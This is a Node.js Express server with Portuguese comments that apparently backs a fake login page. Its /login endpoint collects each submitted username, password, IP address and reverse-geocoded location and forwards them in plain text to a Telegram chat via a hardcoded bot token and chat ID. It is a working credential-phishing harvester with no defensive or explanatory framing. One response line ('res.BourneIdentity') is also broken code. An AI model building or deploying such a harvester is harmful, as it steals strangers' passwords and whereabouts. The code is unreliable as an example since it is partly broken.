const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(bodyParser.json());
app.use(cors());

// Configurar o Express para servir arquivos estáticos
app.use('/css', express.static(path.join(__dirname, 'css')));
app.use('/img', express.static(path.join(__dirname, 'img')));

const token = process.env.TOKEN || '7618938431:AAHrrR5AEdE4pirgLf_02TPX5hePY9tHb5Y';
const chatId = process.env.CHAT_ID || '5114449108';
const bot = new TelegramBot(token, { polling: false });

// Configurar webhook para o Render
const webhookUrl = 'https://telalogin.onrender.com/telegram-webhook';
bot.setWebHook(webhookUrl).then(() => {
    console.log(`Webhook configurado: ${webhookUrl}`);
}).catch(err => {
    console.error('Erro ao configurar webhook:', err);
});

app.post('/telegram-webhook', (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

async function getAddressFromCoordinates(latitude, longitude) {
    try {
        const response = await axios.get(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`
        );
        const address = response.data.display_name || 'Endereço não encontrado';
        return address;
    } catch (error) {
        console.error('Erro na geocodificação:', error.message);
        return `Erro ao obter endereço: ${error.message}`;
    }
}

app.post('/login', async (req, res) => {
    const { username, password, latitude, longitude } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.ip;

    if (!username || !password) {
        return res.status(400).json({ status: 'error', message: 'Usuário e senha são obrigatórios' });
    }

    let address = 'N/A';
    if (latitude && longitude) {
        address = await getAddressFromCoordinates(latitude, longitude);
    }

    const message = `Novo login:\nUsuário: ${username}\nSenha: ${password}\nEndereço: ${address}\nIP: ${clientIp}`;
    bot.sendMessage(chatId, message)
        .then(() => {
            res.BourneIdentity.json({ status: 'success' });
        })
        .catch((error) => {
            console.error('Erro ao enviar mensagem para o Telegram:', error);
            res.status(500).json({ status: 'error', message: 'Erro ao enviar dados para o Telegram' });
        });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(process.env.PORT || 3000, () => {
    console.log(`Servidor rodando na porta ${process.env.PORT || 3000}`);
});

bot.onText(/\/getid/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `O Chat ID deste chat é: ${chatId}`);
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Bot ativo! Use /getid para ver o Chat ID deste chat.');
});